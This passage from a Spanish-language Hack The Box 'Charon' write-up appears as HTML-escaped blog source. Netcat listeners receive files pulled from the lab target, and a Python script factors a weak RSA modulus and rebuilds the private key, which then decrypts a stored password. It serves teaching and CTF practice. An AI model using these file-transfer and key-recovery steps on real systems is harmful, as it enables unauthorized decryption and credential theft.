+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; decoder.pub
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.31] 56648
+❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pass.crypt
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.31] 56650
+❯ &lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;decoder.pub
+afcb9745eb5e553d7b15077363878c1b  decoder.pub
+❯ &lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;pass.crypt
+ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, de acuerdo con las extensiones, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decoder.pub&lt;/code&gt; podría ser una llave pública y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass.crypt&lt;/code&gt; es un archivo que ha sido cifrado utilizando la llave privada, pero no contamos con dicha llave; por lo tanto podríamos tratar de obtener la llave privada a partir de la llave pública y para lograrlo, primeramente debemos de encontrar algunas variables que necesitamos (&lt;strong&gt;Nota&lt;/strong&gt;: Se comparte un recurso para saber un poco más de este tema &lt;a href=&quot;https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html&quot;&gt;readthedocs&lt;/a&gt;):&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;n&lt;/em&gt;&lt;/strong&gt; - RSA modulus&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;e&lt;/em&gt;&lt;/strong&gt; - RSA public exponent&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;p&lt;/em&gt;&lt;/strong&gt; - First factor of the RSA modulus&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;q&lt;/em&gt;&lt;/strong&gt; - Second factor of the RSA modulus&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;d&lt;/em&gt;&lt;/strong&gt; - RSA private exponent&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;m&lt;/em&gt;&lt;/strong&gt; - Remainder component&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;El valor de &lt;strong&gt;&lt;em&gt;n&lt;/em&gt;&lt;/strong&gt; es público y se obtiene de la llave pública y de igual forma el valor de &lt;strong&gt;&lt;em&gt;e&lt;/em&gt;&lt;/strong&gt;. Ahora, si el valor de &lt;strong&gt;&lt;em&gt;n&lt;/em&gt;&lt;/strong&gt; es relativamente pequeño, se puede computar &lt;strong&gt;&lt;em&gt;p&lt;/em&gt;&lt;/strong&gt; y &lt;strong&gt;&lt;em&gt;q&lt;/em&gt;&lt;/strong&gt; ya que &lt;strong&gt;&lt;em&gt;n = p q&lt;/em&gt;&lt;/strong&gt; en donde &lt;strong&gt;&lt;em&gt;p&lt;/em&gt;&lt;/strong&gt; y &lt;strong&gt;&lt;em&gt;q&lt;/em&gt;&lt;/strong&gt; son números primos. Asi que vamos a generar un programa en python que nos ayude a generar dichos valores.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#coding:utf-8
+&lt;/span&gt;  
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.PublicKey&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+  
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decoder.pub&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;importKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de e = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de n = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al imprimir las variables, tenemos que:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 decrypter.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; El valor de e &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 65537 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; El valor de n &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 85161183100445121230463008656121855194098040675901982832345153586114585729131
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora para encontrar &lt;strong&gt;&lt;em&gt;p&lt;/em&gt;&lt;/strong&gt; y &lt;strong&gt;&lt;em&gt;q&lt;/em&gt;&lt;/strong&gt; vamos a hacer uso de &lt;a href=&quot;http://factordb.com/&quot;&gt;factordb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-pq.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; El valor de p &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 280651103481631199181053614640888768819 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; El valor de q &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 303441468941236417171803802700358403049
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, el valor de &lt;strong&gt;&lt;em&gt;m&lt;/em&gt;&lt;/strong&gt; lo obtenemos de la siguiente expresión: &lt;strong&gt;&lt;em&gt;m = n - (p + q - 1)&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; El valor de m &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 85161183100445121230463008656121855193513948103479115215992296168773338557264
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para encontrar &lt;strong&gt;&lt;em&gt;d&lt;/em&gt;&lt;/strong&gt; vamos a hacer uso de la &lt;strong&gt;Función inversa multiplicativa modular&lt;/strong&gt; y de los valores que encontramos anteriormente que son &lt;strong&gt;&lt;em&gt;e&lt;/em&gt;&lt;/strong&gt; y &lt;strong&gt;&lt;em&gt;m&lt;/em&gt;&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Modular multiplicative inverse function in Python
+&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'modular inverse does not exist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;
+  
+  &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; El valor de d &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 21250987814893564133283367312544315727523797355452606165102736035279600512161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya con todos los valores obtenidos, podemos generar una llave privada:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;priv_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; La clave privada es:
+&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
+MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
+LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
+A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
+&lt;span class=&quot;nv&quot;&gt;BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez que tenemos la llave privada, vamos a descifrar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass.crypt&lt;/code&gt; mediante la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl&lt;/code&gt; en donde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;private.key&lt;/code&gt; es un archivo que contiene nuestra llave privada que generamos y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass.decrypted&lt;/code&gt; es el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass.crypt&lt;/code&gt; ya descifrado:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-decrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; private.key &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; pass.crypt &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; pass.decrypted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pass.decrypted
+───────┬─────────────────────────────────────
+       │ File: pass.decrypted
+───────┼─────────────────────────────────────
+   1   │ nevermindthebollocks
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo tanto, nuestro programa en python sería el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#coding:utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.PublicKey&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;decoder.pub&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;importKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Con factordb.com se puede obtener p y q ya que n es un número relativamente pequeño
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;280651103481631199181053614640888768819&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;303441468941236417171803802700358403049&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Modular multiplicative inverse function in Python
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
